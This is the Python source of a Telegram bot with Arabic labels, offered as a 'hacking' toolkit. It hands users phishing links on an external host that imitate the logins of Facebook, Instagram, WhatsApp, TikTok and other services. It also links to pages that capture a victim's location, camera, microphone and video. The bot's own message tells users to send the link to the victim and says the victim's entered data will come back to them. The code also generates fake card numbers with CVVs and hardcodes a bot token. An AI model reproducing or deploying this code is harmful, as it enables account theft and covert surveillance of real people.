import os, time, threading, random, string, requests, logging, json, io
from flask import Flask, request
from telebot import TeleBot, types
from io import BytesIO
import tempfile

# مكتبات إضافية للباركود والاختصار والترجمة (تثبت لاحقاً)
try:
    import qrcode as qrcode_module
    from qrcode.image.pil import PilImage
    from pyzbar.pyzbar import decode as qr_decode
    from PIL import Image
except ImportError:
    # المكتبات ستثبت تلقائياً عند النشر عبر requirements.txt
    pass

try:
    from googletrans import Translator
    translator_available = True
except ImportError:
    translator_available = False

try:
    import pyshorteners
    shortener_available = True
except ImportError:
    shortener_available = False

# ========== الإعدادات ==========
TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
BASE_URL = "https://fgnral-html.onrender.com"
WEBHOOK_URL = "https://gamee-08ue.onrender.com"
CALL_SITE = "https://callmyphone.org/app"
ADMIN_CHAT_ID = "6829017835"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

user_states = {}  # لتتبع حالة المستخدم (waiting_call_number, waiting_shorten, إلخ)
bot_rating = 0

JOKES = [
    "مرة واحد بخيل جداً.. ابنه مات قال الحقوه هاتوه",
    "مرة واحد محشش قعد 3 أيام في البيت ليه؟ لأنه لقى الباب مفتوح",
    "مرة اثنين محششين ركبوا سيارة قالوا: بنروح على السينما، قالوا: لأ خلينا نضل بالسيارة أحسن لأن الشاشة أكبر",
    "مرة واحد غبي جداً لقى ورقة مكتوب عليها 'أنظر للخلف' فضل يلف على نفسه",
    "محشش شاف تايه قال: يا ترى إيه اللي مكتوب فيها؟! قام قاريها: 'مكتوب عليها صُنع في اليابان'",
    "واحد بيقول لمراته: انا طلعت من بيتي فقير ورجعت غني! قالتله: اشتغلت؟ قالها: لا لقيت البيت اتسرق",
    "واحد غبي دق على المطعم قالهم: عندكم أكل؟ قالوله: أيوة، قالهم: طب إقفلوا الباب"
]

def generate_password(length=16):
    chars = string.ascii_letters + string.digits + "!@#$%^&*()"
    return ''.join(random.choice(chars) for _ in range(length))

def generate_fake_visa():
    prefixes = ["4", "5", "37", "34"]
    prefix = random.choice(prefixes)
    length = 16 if prefix in ["4", "5"] else 15
    while len(prefix) < length:
        prefix += str(random.randint(0,9))
    number = prefix
    exp_month = str(random.randint(1,12)).zfill(2)
    exp_year = str(random.randint(2025,2030))
    cvv = str(random.randint(100,999))
    return f"💳 رقم: {number}\n📅 تاريخ: {exp_month}/{exp_year}\n🔒 CVV: {cvv}"

def create_temp_email():
    try:
        session = requests.Session()
        headers = {'User-Agent': 'Mozilla/5.0'}
        r = session.get('https://api.mail.tm/domains', headers=headers)
        domain = r.json()['hydra:member'][0]['domain']
        local_part = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
        email = f"{local_part}@{domain}"
        password = generate_password(12)
        data = {'address': email, 'password': password}
        session.post('https://api.mail.tm/accounts', json=data, headers=headers)
        return f"📧 البريد: {email}\n🔑 كلمة المرور: {password}"
    except Exception as e:
        return "فشل إنشاء بريد مؤقت، حاول لاحقاً"

def shorten_url(url):
    try:
        if shortener_available:
            s = pyshorteners.Shortener()
            return s.tinyurl.short(url)
        else:
            r = requests.get(f"https://tinyurl.com/api-create.php?url={requests.utils.quote(url)}", timeout=5)
            if r.status_code == 200: return r.text.strip()
    except:
        pass
    return url

def translate_text(text, dest='ar'):
    if translator_available:
        translator = Translator()
        res = translator.translate(text, dest=dest)
        return res.text
    return "ميزة الترجمة غير متاحة، تحتاج googletrans"

def generate_qr_code(data):
    qr = qrcode_module.QRCode(version=1, box_size=10, border=4)
    qr.add_data(data)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    bio = BytesIO()
    img.save(bio, 'PNG')
    bio.seek(0)
    return bio

def read_qr_code(image_data):
    image = Image.open(BytesIO(image_data))
    decoded = qr_decode(image)
    if decoded:
        return decoded[0].data.decode('utf-8')
    return "لم يتم العثور على QR code"

def main_menu_markup(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=2)

    # اختراقات (callback)
    tools_pairs = [
        ("📘 اختراق فيسبوك", "phish_facebook.html", "🎵 اختراق تيك توك", "phish_tiktok.html"),
        ("👻 اختراق سناب شات", "phish_snapchat.html", "📷 اختراق انستقرام", "phish_instagram.html"),
        ("💬 اختراق واتساب", "phish_whatsapp.html", "✈️ اختراق تيليجرام", "phish_telegram.html"),
        ("🐦 اختراق تويتر", "phish_twitter.html", "▶️ اختراق يوتيوب", "phish_youtube.html"),
        ("🎮 اختراق ديسكورد", "phish_discord.html", "🤖 اختراق ريدت", "phish_reddit.html"),
        ("📍 سحب الموقع", "gps.html", "📸 اختراق الكاميرا", "camera.html"),
        ("🎙️ تسجيل الصوت", "mic.html", "🎥 تصوير فيديو", "video.html"),
    ]
    for left_name, left_file, right_name, right_file in tools_pairs:
        markup.row(types.InlineKeyboardButton(left_name, callback_data=f"phish|{left_file}"),
                   types.InlineKeyboardButton(right_name, callback_data=f"phish|{right_file}"))

    # بلاغات (URL)
    reports = [
        ("🐦 ضرب بلاغ تويتر X", "https://help.twitter.com/forms"),
        ("👻 ضرب بلاغ سناب شات", "https://support.snapchat.com/community-report"),
        ("▶️ ضرب بلاغ يوتيوب", "https://www.youtube.com/reportingtool"),
        ("✈️ ضرب بلاغ تيليجرام", "https://telegram.org/faq_report"),
        ("🎵 ضرب بلاغ تيك توك", "https://www.tiktok.com/legal/report/feedback"),
        ("📷 ضرب بلاغ انستقرام", "https://help.instagram.com/contact/383679321740945"),
    ]
    for name, link in reports:
        markup.row(types.InlineKeyboardButton(name, url=link))

    # أدوات جديدة
    markup.row(types.InlineKeyboardButton("📞 اتصال وهمي", callback_data="call"),
               types.InlineKeyboardButton("📱 فحص الجهاز", callback_data="phish|device.html"))
    markup.row(types.InlineKeyboardButton("🔍 معرفة الايدي", callback_data="myid"),
               types.InlineKeyboardButton("💬 فك حظر واتساب", callback_data="unban"))
    markup.row(types.InlineKeyboardButton("🔗 اختصار رابط", callback_data="shorten"),
               types.InlineKeyboardButton("🌐 ترجمة نص", callback_data="translate"))
    markup.row(types.InlineKeyboardButton("📷 قراءة باركود", callback_data="readqr"),
               types.InlineKeyboardButton("🖼️ إنشاء باركود", callback_data="createqr"))
    markup.row(types.InlineKeyboardButton("💳 فيزا وهمية", callback_data="visa"),
               types.InlineKeyboardButton("✉️ بريد وهمي", callback_data="tempmail"))
    markup.row(types.InlineKeyboardButton("😂 نكتة", callback_data="joke"),
               types.InlineKeyboardButton("⭐ تقييم البوت", callback_data="rate"))
    markup.row(types.InlineKeyboardButton("📜 شروط", callback_data="terms"),
               types.InlineKeyboardButton("💻 كيف تصبح هاكر", callback_data="hack"))
    markup.row(types.InlineKeyboardButton("🔄 رجوع", callback_data="back"))

    return markup

@app.route(f"/{TOKEN}", methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        try:
            json_string = request.get_data().decode('utf-8')
            update = types.Update.de_json(json_string)
            bot.process_new_updates([update])
            return ''
        except Exception as e:
            return ''
    return '!', 403

@bot.message_handler(commands=['start'])
def welcome(message):
    chat_id = message.chat.id
    user_states.pop(chat_id, None)
    bot.send_message(chat_id, "🔱 <b>بوت الجنرال V2</b>\n\nاختر الأداة من القائمة أدناه:",
                     reply_markup=main_menu_markup(chat_id), parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    data = call.data
    msg_id = call.message.message_id

    if data == "back":
        bot.edit_message_text("🔱 <b>بوت الجنرال V2</b>\n\nاختر الأداة:",
                              chat_id, msg_id, reply_markup=main_menu_markup(chat_id), parse_mode="HTML")
        bot.answer_callback_query(call.id)
        return

    if data.startswith("phish|"):
        file = data.split("|")[1]
        link = f"{BASE_URL}/{file}?chat={chat_id}"
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
        bot.edit_message_text(f"🔗 رابط التصيد:\n{link}\n\nأرسل هذا الرابط للضحية. عند إدخال بياناته ستصل إليك هنا.",
                              chat_id, msg_id, reply_markup=markup, parse_mode="HTML")
        bot.answer_callback_query(call.id)
        return

    if data == "call":
        user_states[chat_id] = "waiting_call_number"
        bot.send_message(chat_id, "📞 أرسل رقم الهاتف (بدون + او 00)\nمثال: 967940201477")
        bot.answer_callback_query(call.id)
        return

    if data == "myid":
        user_id = call.from_user.id
        bot.send_message(chat_id, f"🆔 معرف حسابك: {user_id}")
        bot.answer_callback_query(call.id)
        return

    if data == "unban":
        text = ("🔓 <b>فك حظر واتساب</b>\n\n"
                "أرسل هذه الرسالة للإيميلات:\n"
                "<code>عزيزي الدعم،\nرقمي +967XXXXXXXX</code>\n\n"
                "الإيميلات:\n- smb@support.whatsapp.com\n- android@support.whatsapp.com\n- support@support.whatsapp.com")
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
        bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=markup)
        bot.answer_callback_query(call.id)
        return

    if data == "shorten":
        user_states[chat_id] = "waiting_shorten"
        bot.send_message(chat_id, "🔗 أرسل الرابط الذي تريد اختصاره:")
        bot.answer_callback_query(call.id)
        return

    if data == "translate":
        user_states[chat_id] = "waiting_translate"
        bot.send_message(chat_id, "🌐 أرسل النص الذي تريد ترجمته:")
        bot.answer_callback_query(call.id)
        return

    if data == "readqr":
        user_states[chat_id] = "waiting_readqr"
        bot.send_message(chat_id, "📷 أرسل صورة تحتوي على باركود أو QR code:")
        bot.answer_callback_query(call.id)
        return

    if data == "createqr":
        user_states[chat_id] = "waiting_createqr"
        bot.send_message(chat_id, "🖼️ أرسل النص أو الرابط الذي تريد إنشاء باركود له:")
        bot.answer_callback_query(call.id)
        return

    if data == "visa":
        visa = generate_fake_visa()
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
        bot.send_message(chat_id, visa, reply_markup=markup)
        bot.answer_callback_query(call.id)
        return

    if data == "tempmail":
        email_info = create_temp_email()
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
        bot.send_message(chat_id, email_info, reply_markup=markup)
        bot.answer_callback_query(call.id)
        return

    if data == "joke":
        joke = random.choice(JOKES)
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
        bot.send_message(chat_id, joke, reply_markup=markup)
        bot.answer_callback_query(call.id)
        return

    if data == "rate":
        global bot_rating
        bot_rating += 1
        bot.send_message(chat_id, f"⭐ شكراً! التقييمات: {bot_rating}\nالتقييم: 5.0 🌟")
        bot.answer_callback_query(call.id)
        return

    if data == "terms":
        terms = ("📜 <b>شروط الاستخدام</b>\n\n"
                 "✅ لن أستخدمه فيما يغضب الله.\n"
                 "✅ لن أسرق أو أتجسس.\n"
                 "✅ للمزاح والربح المشروع فقط.\n"
                 "⚠️ المستخدم يتحمل المسؤولية.")
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
        bot.send_message(chat_id, terms, parse_mode="HTML", reply_markup=markup)
        bot.answer_callback_query(call.id)
        return

    if data == "hack":
        steps = ("💻 <b>كيف تصبح هاكر:</b>\n"
                 "1. أساسيات الشبكات\n2. Linux\n3. Python\n"
                 "4. ثغرات الويب\n5. أدوات مثل Burp\n6. منصات تدريب (HTB, THM)\n"
                 "7. شهادات (CEH, OSCP)")
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
        bot.send_message(chat_id, steps, parse_mode="HTML", reply_markup=markup)
        bot.answer_callback_query(call.id)
        return

    bot.answer_callback_query(call.id, text="غير معروف")

# معالجة الحالات التفاعلية النصية
@bot.message_handler(func=lambda msg: user_states.get(msg.chat.id) == "waiting_call_number")
def process_call_number(msg):
    chat_id = msg.chat.id
    number = msg.text.strip().replace("+", "").replace(" ", "")
    if not number:
        bot.reply_to(msg, "⚠️ أدخل رقماً صحيحاً.")
        return
    url = f"{CALL_SITE}?number={number}"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
    bot.send_message(chat_id, f"📞 رابط الاتصال الوهمي:\n{url}", reply_markup=markup)
    user_states.pop(chat_id, None)

@bot.message_handler(func=lambda msg: user_states.get(msg.chat.id) == "waiting_shorten")
def process_shorten(msg):
    chat_id = msg.chat.id
    url = msg.text.strip()
    if not url.startswith("http"):
        bot.reply_to(msg, "يرجى إرسال رابط صالح يبدأ بـ http")
        return
    short = shorten_url(url)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
    bot.send_message(chat_id, f"🔗 الرابط المختصر:\n{short}", reply_markup=markup)
    user_states.pop(chat_id, None)

@bot.message_handler(func=lambda msg: user_states.get(msg.chat.id) == "waiting_translate")
def process_translate(msg):
    chat_id = msg.chat.id
    text = msg.text
    translated = translate_text(text, 'ar')
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
    bot.send_message(chat_id, f"🌐 النص المترجم:\n{translated}", reply_markup=markup)
    user_states.pop(chat_id, None)

@bot.message_handler(content_types=['photo'])
def handle_photo(msg):
    chat_id = msg.chat.id
    if user_states.get(chat_id) == "waiting_readqr":
        file_info = bot.get_file(msg.photo[-1].file_id)
        downloaded = bot.download_file(file_info.file_path)
        result = read_qr_code(downloaded)
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
        bot.send_message(chat_id, f"📷 نتيجة قراءة الباركود:\n{result}", reply_markup=markup)
        user_states.pop(chat_id, None)
    else:
        bot.reply_to(msg, "لم يتم طلب قراءة باركود")

@bot.message_handler(func=lambda msg: user_states.get(msg.chat.id) == "waiting_createqr")
def process_createqr(msg):
    chat_id = msg.chat.id
    data = msg.text
    img = generate_qr_code(data)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
    bot.send_photo(chat_id, img, reply_markup=markup)
    user_states.pop(chat_id, None)

# منع السكون
def keep_alive():
    while True:
        time.sleep(600)
        try: requests.get(f"{WEBHOOK_URL}/health", timeout=5)
        except: pass

threading.Thread(target=keep_alive, daemon=True).start()

if __name__ == '__main__':
    bot.remove_webhook()
    bot.set_webhook(url=f"{WEBHOOK_URL}/{TOKEN}")
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))